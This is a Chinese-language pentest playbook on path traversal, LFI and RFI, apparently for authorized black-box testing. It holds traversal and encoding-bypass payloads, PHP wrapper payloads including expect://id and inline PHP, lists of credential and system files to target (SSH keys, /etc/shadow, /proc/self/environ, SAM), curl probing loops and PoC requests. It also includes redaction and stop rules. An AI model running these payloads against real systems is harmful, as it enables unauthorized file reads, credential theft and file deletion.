# 路径遍历 / LFI / RFI — 决策索引

> 视角:让服务端读 / 包含 / 执行不该读的文件。本文件execution-framework + 路由表。

---

## 子文件路由(Phase 4 读哪一份?)

| 入口信号 | MUST Read |
|---|---|
| 文件路径入参(`file`/`path`/`filename`/`page`/`include`)/ 任意文件读 / 任意文件删 | `10-traversal-lfi.md` |
| 参数被当作 URL 拉(allow_url_include)/ 远程脚本拉入执行 / 日志投毒触发 | `11-rfi-logpoison.md` |
| 目标是 PHP 站(`.php` / X-Powered-By: PHP),探伪协议 / Filter / Data / Zip | `12-php-wrappers.md` |
| 探到包含点,链上 Phar / Session / Proc 等高级利用 | `13-phar-session-proc.md` |

> 与上传场景的路径穿越见 [`../file-upload/11-archive-traversal.md`](../file-upload/11-archive-traversal.md)。

---


> 视角：黑盒，目标是读到不该读的文件 / 删到不该删的文件

## 1. 一句话说清

路径遍历 = 用户控制的文件路径绕过应用的"目录边界"。
最经典：`?file=../../etc/passwd`。
渗透价值：能读 = P1，读到配置 → DB 密码 → P0；任意文件删 = P0（**易遗漏**）。

---

## 2. 高频入口点

### 2.1 高危参数名（按 wooyun 案例频次）

| 参数 | 出现次数 | 典型场景 |
|------|---------|---------|
| `filename` | 63 | 文件下载 / 附件 |
| `filepath` | 30 | 路径指定 |
| `path` | 20 | 通用路径 |
| `hdfile` | 14 | 特定 CMS |
| `inputFile` | 9 | Resin / Java |
| `file` | 7 | 通用 |
| `url` | 4 | SSRF / 文件读复合 |
| `filePath` | 4 | Java 驼峰 |
| `FileUrl` | 3 | ASP.NET |
| `XFileName` | 3 | 特定 CMS |

### 2.2 参数命名规律

```
通用：file, path, name, url, src, dir, folder
下载：download, down, attachment, attach, doc
读取：read, load, get, fetch, open, input
文件：filename, filepath, fname, fn, resource
模板：template, tpl, page, include, temp
```

复合参数：
```
?path=xxx&name=xxx
?filePath=xxx&fileName=xxx
?FileUrl=xxx&FileName=xxx
?file=xxx&showname=xxx
```

### 2.3 高频漏洞端点 TOP

```
down.php           (20 次)
download.jsp       (17 次)
download.asp       (13 次)
download.php       (7 次)
download.ashx      (7 次)
viewsharenetdisk.php (6 次)
GetPage.ashx       (6 次)
pic.php            (4 次)
openfile.asp       (4 次)
do_download.jsp    (8 次)
```

---

## 3. 探测手法

### 3.1 基础遍历序列

```
../
../../
../../../
../../../../
../../../../../
../../../../../../
```

### 3.2 编码梯度（顺序尝试）

```
../        →  %2e%2e%2f
../        →  %252e%252e%252f                # 双重 URL 编码
../        →  ..%c0%af / ..%c1%9c            # 超长 UTF-8（Tomcat / GlassFish）
../        →  %u002e%u002e%u2215             # 16-bit Unicode（IIS / 旧 Java）
../        →  ....// / ..../                  # 过滤器删一次后剩 ../
../        →  ..%2f%2e / %2e%2e/              # 混合
```

### 3.3 截断 / 协议

```
%00       ../../../etc/passwd%00.jpg       # PHP <5.3.4 / 旧 Java
;         /admin;.jpg                       # IIS / Tomcat
file://   file:///etc/passwd
view-source:  view-source:file:///etc/passwd
php://filter  php://filter/convert.base64-encode/resource=index.php
zip://    zip://archive.zip%23shell.php
data://   data://text/plain,<?php phpinfo();?>
expect:// expect://id
```

### 3.4 路径正则化绕过

```
....//      # 双点斜杠
..../       # 多点
..\..\      # 反斜杠
..\../      # 混合
/./         # 冗余
//          # 双斜杠
/;/         # 分号路径段
```

### 3.5 Base64 / Hex 绕过

```
# Winmail 案例
?filename=Li4vLi4vLi4vLi4vLi4vLi4vd2luZG93cy93aW4uaW5p
（base64 解码 = ../../../../../../windows/win.ini）

# 淘客帝国 CMS
?url=cGljLnBocA==
（base64 = pic.php）
```

### 3.6 敏感文件目标库

#### Linux

```
# 系统账户
/etc/passwd                /etc/shadow
/etc/hosts                 /etc/group
/etc/sudoers               /etc/issue

# SSH
/root/.ssh/authorized_keys     /root/.ssh/id_rsa
/home/{user}/.ssh/authorized_keys
/home/{user}/.ssh/id_rsa

# 历史 / 进程（信息金矿）
/root/.bash_history
/home/{user}/.bash_history
/proc/self/environ          # 含进程启动环境变量（含 secret）
/proc/self/cmdline
/proc/self/fd/{n}
/proc/version               /proc/cpuinfo
/proc/{pid}/environ

# Web 配置
/etc/nginx/nginx.conf
/etc/httpd/conf/httpd.conf
/etc/apache2/apache2.conf
/etc/my.cnf                 /etc/mysql/my.cnf
```

#### Windows

```
C:\windows\win.ini          C:\boot.ini
C:\windows\system32\config\sam
C:\windows\repair\sam
C:\inetpub\wwwroot\web.config
C:\windows\system32\inetsrv\config\applicationHost.config
C:\windows\system32\drivers\etc\hosts
```

#### Java Web

```
# 核心配置
/WEB-INF/web.xml
/WEB-INF/classes/jdbc.properties
/WEB-INF/classes/database.properties
/WEB-INF/classes/applicationContext.xml
/WEB-INF/classes/hibernate.cfg.xml
/WEB-INF/classes/application.yml
../WEB-INF/web.xml
../../WEB-INF/web.xml
/../WEB-INF/web.xml%3f

# Spring Boot 配置(高价值)
/WEB-INF/classes/application.properties
/WEB-INF/classes/application-prod.yml
/WEB-INF/classes/application-dev.yml
/WEB-INF/classes/bootstrap.yml
/config/application.properties
/BOOT-INF/classes/application.properties

# Shiro 配置
/WEB-INF/classes/shiro.ini
/WEB-INF/shiro.ini
/../WEB-INF/classes/shiro.ini

# Struts2 配置
/WEB-INF/classes/struts.xml
/WEB-INF/classes/struts2.xml
/WEB-INF/classes/struts.properties

# MyBatis / Hibernate
/WEB-INF/classes/mybatis-config.xml
/WEB-INF/classes/mapper/UserMapper.xml
/WEB-INF/classes/hibernate.cfg.xml

# 日志配置(泄露路径信息)
/WEB-INF/classes/log4j.properties
/WEB-INF/classes/log4j2.xml
/WEB-INF/classes/logback.xml
/WEB-INF/classes/logback-spring.xml

# 待办与工作文件(信息金矿)
/WEB-INF/classes/TODO.txt
/WEB-INF/classes/README.txt
/WEB-INF/classes/note.txt
/WEB-INF/classes/db.txt

# Java 应用服务器特定文件
# Tomcat:
/usr/local/tomcat/conf/tomcat-users.xml
/usr/local/tomcat/conf/server.xml
/opt/tomcat/conf/tomcat-users.xml

# WebLogic:
/wlserver/user_projects/domains/base_domain/config/config.xml
/wlserver/user_projects/domains/base_domain/security/SerializedSystemIni.dat
/wlserver/user_projects/domains/base_domain/servers/AdminServer/security/boot.properties

# JBoss:
/standalone/configuration/standalone.xml
/standalone/configuration/mgmt-users.properties
/domain/configuration/domain.xml

# 本地开发文件(仅限测试/开发环境)
/WEB-INF/classes/application-local.yml
/WEB-INF/classes/application-test.yml
/WEB-INF/classes/application-debug.yml
```

**Java文件读取方法指纹**(识别服务端使用哪种Java API读文件，辅助绕过)：
```
# 常见Java文件读取API对应的错误特征:
# java.io.File + FileReader/BufferedReader → 最基础
# java.nio.file.Files.readAllLines() → Path.of()参数，可能支持file:///
# java.nio.file.Files.readAllBytes() → 一次性全读
# java.util.Scanner → useDelimiter("\\A")返回全文
# org.apache.commons.io.FileUtils → 常见工具类
# org.springframework.core.io.ClassPathResource → classpath:前缀可读WEB-INF

# 探测技巧:
# 1. 路径不存在 → 观察错误信息中的异常类名
# 2. 路径是目录 → 某些实现会报 "Is a directory" 错误
# 3. 路径无权限 → FileNotFoundException vs AccessDeniedException 区分
```

#### PHP / 框架

```
/config.php           /config.inc.php
/db.php               /database.php
/conn.php             /common.php
/wp-config.php        # WordPress
/config_global.php    # Discuz
/config_ucenter.php   # Discuz UCenter
/application/config/database.php   # CodeIgniter
/config/database.php  # Laravel
/.env                 /.env.production
```

#### .NET

```
/web.config
/connectionStrings.config
/App_Data/database.mdf
```

### 3.7 探针策略

```bash
# 标准 8-12 层 ../
for i in 1 2 3 4 5 6 7 8 9 10; do
  prefix=$(printf '../%.0s' $(seq 1 $i))
  curl -s "https://target/down.php?file=${prefix}etc/passwd" \
    | grep -q "root:" && echo "Hit: $i levels"
done

# 编码递增
for enc in "../" "..%2f" "%2e%2e%2f" "%252e%252e%252f" "..%c0%af" "....//"; do
  curl -s "https://target/down.php?file=${enc}${enc}${enc}etc/passwd"
done

# Java Web 模式
curl "https://target/download.jsp?path=../WEB-INF/web.xml"
curl "https://target/download.aspx?file=../web.config"
```

---

## 4. Bypass 矩阵

| 拦 | 绕 |
|---|---|
| `../` 字面拦 | URL 编码 / 双重编码 / Unicode 超长 / `....//` / `..\../` |
| 后缀白名单（`.jpg`） | `%00` 截断 / `?file=../../etc/passwd%00.jpg` / `;.jpg` |
| 黑名单 `passwd` | `pas%73wd` / `passwD` / `pas\x73wd`（旧版） |
| 绝对路径拦 | 相对路径 + 多 `../` |
| 多 `../` 拦 | 嵌套：`....//` 删一次后剩 `../` |
| 关键字 `etc` | `EtC` / `e%74c` / 全编码 |
| 仅允许某目录 | 利用规范化差异：`/allowed/../etc/passwd` |
| 长度限制 | 短文件：`/etc/hosts` 比 `/etc/passwd` 短 |

---

## 5. 利用提权 / 横向

```
读到 /etc/passwd → 拿到用户名列表
  ↓
读到 /home/web/.ssh/id_rsa → SSH 私钥（不要使用）
  ↓
读到 application.yml / .env → DB / Redis / API 密钥
  ↓
读到 /proc/self/environ → 启动环境变量（含 secret）
  ↓
读到 /WEB-INF/classes/jdbc.properties → JDBC 连接串

→ 渗透报告时**最好停在"配置文件 + 第一行内容（脱敏）"**
  不要尝试用读到的密钥登录任何服务

# 任意文件删 → 瘫痪服务
DELETE /api/upload?path=../../web/index.html → 首页消失
```

参考 wooyun 案例：
- `?urlParam=../../../WEB-INF/web.xml%3f`（华云数据，配置泄露）
- `upload.aspx?id=8&dir=../../../../`（某家电厂商，目录浏览 + 任意删）
- `down.php?dd=../down.php`（某政府网站，源码下载）
- `IP:8888/../../../etc/shadow`（某大厂内部，shadow 读取）

---

## 6. 真实案例指纹

| 案例 ID | Payload | 结果 |
|--------|---------|------|
| wooyun-华云数据 | `?urlParam=../../../WEB-INF/web.xml%3f` | 配置泄露 |
| wooyun-某家电 | `upload.aspx?id=8&dir=../../../../` | 目录浏览 + 任意删 |
| wooyun-某政府 | `down.php?dd=../down.php` | 源码下载 |
| wooyun-上海海事 | `/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/.../etc/passwd` | UTF-8 超长（GlassFish） |
| Resin | `/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd` | 绝对路径 |
| Winmail | `?filename={base64 of ../../../windows/win.ini}` | base64 绕过 |
| 淘客帝国 | `pic.php?url=cGljLnBocA==` | base64 |

通用指纹：

- 响应中 `root:x:0:0:root:/root:/bin/bash` → 命中 /etc/passwd
- 响应中 `[boot loader]` 或 `[fonts]` → win.ini
- 响应中 `<?xml version="1.0"` + `<web-app` → web.xml
- 响应中 `connectionString=` → web.config
- 响应中 `;application.properties` 字段 → Spring Boot 配置

---

## 7. 复现 / 证据要点

### 7.1 报告必备

1. 完整请求 URL
2. 响应状态 + 关键内容
3. 读到的文件第一行 / 关键标记字段（**脱敏**）
4. 影响升级链（如能读到 DB 密码，但不实际利用）

### 7.2 PoC 模板

```http
GET /download.php?file=../../../../etc/passwd HTTP/1.1
Host: target.com

HTTP/1.1 200 OK
Content-Type: application/octet-stream

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
... (前 5 行作证，其余脱敏)
```

### 7.3 配置文件类（高价值，必脱敏）

```http
GET /download?file=../../config/application-prod.yml HTTP/1.1
...

HTTP/1.1 200 OK

spring:
  datasource:
    url: jdbc:mysql://10.0.x.x:3306/****
    username: ****
    password: M****d!（13 位）
    driver-class-name: com.mysql.cj.jdbc.Driver
  redis:
    host: 10.0.x.x
    password: r****x（10 位）

我已停止在"读取该配置"步骤，未尝试连接任何凭据。
完整文件 sha256: abc123...（证明拿到原文）
```

### 7.4 CVSS

```
任意文件读（含敏感）  CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N = 7.5
仅读公开内容          CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N = 5.3
读到 DB 配置 → 链 P0 = 9.8
任意文件删            CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H = 8.6
任意文件覆盖（webroot） CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8
```

### 7.5 影响段

```
通过 /download.php 接口的 file 参数，攻击者可使用 ../ 序列读取
任意文件。已确认可读：
1. /etc/passwd（系统用户列表）
2. /var/www/html/config/application-prod.yml（DB / Redis 凭据）
3. /proc/self/environ（启动环境变量）

最严重链路：
  任意文件读 → application-prod.yml → MySQL 密码 → 直连数据库
（我已停止在"读到 yml"步骤，未尝试连接 DB）

测试 5 次，复现率 100%。
```

---

## 8. 不要做的事

- **禁**：用读到的 SSH 私钥 / DB 密码登录任何服务。
- **禁**：读取 `/etc/shadow`（即使能读，也会被怀疑越线）。仅做"探测能力"证明，看到 `root:x:` 行即停。
- **禁**：批量读取多个用户的 `.bash_history` / `.aws/credentials`。仅证明 1 个 sample。
- **禁**：尝试任意文件删除真实生产文件（`index.html`、`.htaccess`）。在测试环境验证 / 在受影响目录创建一个 PoC 文件再删它。
- **禁**：把读到的源码 / 配置上传到 GitHub / 第三方仓库。本地保存，报告后删除。
- **报告中**：源码 / 配置必须脱敏。可附 sha256 hash 证明拿到过原文。

## H1 真实案例

_共 163 份 HackerOne 已披露 High/Critical 报告命中本类，按 (赏金 + 投票×100) 排序取 Top 12_

| Severity | $ | 程序 | 标题（点击看原报告） | 摘要 |
|---|--:|---|---|---|
| Critical | 20000 usd | GitLab | [Arbitrary file read via the UploadsRewriter when moving and issue](https://hackerone.com/reports/827052) | Summary The `UploadsRewriter` does not validate the file name, allowing arbitrary files to be copied via directory traversal wh… |
| Critical | 29000 usd | GitLab | [Arbitrary file read  via the bulk imports UploadsPipeline](https://hackerone.com/reports/1439593) | Summary The bulk imports api does not remove symlinks when untaring the uploads.tar.gz file, allowing arbitrary files to be rea… |
| Critical | 16000 usd | GitLab | [Arbitrary file read during project import](https://hackerone.com/reports/1132378) | NOTE! Thanks for submitting a report! Please replace *all* the (parenthesized) sections below with the pertinent details. Remem… |
| Critical | — | Starbucks | [Misuse of an authentication cookie combined with a path traversal on app.starbucks.com permitted …](https://hackerone.com/reports/876295) | Misuse of an authentication cookie combined with a path traversal on app.starbucks.com permitted access to restricted data |
| High | 6000 usd | Mozilla | [Mozilla VPN Clients: RCE via file write and path traversal](https://hackerone.com/reports/2995025) | Summary: Hi! I decided to have another look at the Mozilla VPN Client, after #2920675 was set to resolved. When going over all … |
| High | 12000 usd | GitLab | [Path traversal in Nuget Package Registry](https://hackerone.com/reports/822262) | Summary There's a path traversal issue in Nuget package registry which was released to GitLab-EE recently |
| High | — | LY Corporation | [Path traversal in filename in LINE Mac client](https://hackerone.com/reports/727727) | Path traversal in filename in LINE Mac client |
| Critical | — | WordPress | [RCE as Admin defeats WordPress hardening and file permissions](https://hackerone.com/reports/436928) | This vulnerability was found when I found myself in the following scenario: My collegue set up WordPress on his local machine a… |
| High | — | PortSwigger Web Security | [[portswigger.net] Path Traversal al /cms/audioitems](https://hackerone.com/reports/2424815) | Prelude. I wasn't going to report it, I thought it was your laboratory but after my first analysis this seems real. Description… |
| Critical | 4000 usd | Internet Bug Bounty | [Path traversal and file disclosure vulnerability in Apache HTTP Server 2.4.49](https://hackerone.com/reports/1394916) | A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49 |
| High | — | Lichess | [Path Traversal Vulnerability in Lila Project](https://hackerone.com/reports/3181066) | Summary: A path traversal vulnerability was discovered in the Lila project that allows an attacker to access arbitrary files on… |
| High | 1000 usd | Aiven Ltd | [Zero day path traversal vulnerability in Grafana 8.x allows unauthenticated arbitrary local file …](https://hackerone.com/reports/1415820) | Summary: Hi team, I've found a path traversal issue in the Grafana instances hosted on the Aiven platforms |

**命中本类的 weakness 分布：**

- Path Traversal：144 条
- Uncategorized → 手工归类：7 条
- Path Traversal: '.../...//'：5 条
- Relative Path Traversal：2 条
- External Control of File Name or Path：1 条
- File Manipulation：1 条
- PHP Local File Inclusion：1 条
- Untrusted Search Path：1 条
- Insecure Temporary File：1 条



---

完整 Payload 库见同级子文件。
